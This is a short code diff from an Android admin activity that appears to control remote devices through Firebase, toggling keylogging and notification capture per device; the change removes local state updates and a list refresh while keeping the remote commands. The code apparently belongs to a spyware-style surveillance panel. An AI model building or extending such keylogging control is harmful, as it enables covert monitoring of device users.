@@ -66,15 +66,12 @@ class AdminMainActivity : AppCompatActivity() {
         adapter = DeviceAdapter(deviceList) { device, type, newState ->
             val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
             if (type == "key") {
-                device.keylogging = newState
                 ref.child("keylogging").setValue(newState)
                 ref.child("status").child("keylogging").setValue(newState)
             } else {
-                device.notifications = newState
                 ref.child("notifications").setValue(newState)
                 ref.child("status").child("notifications").setValue(newState)
             }
-            adapter.notifyDataSetChanged()
             Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
         }
         recyclerView.adapter = adapter
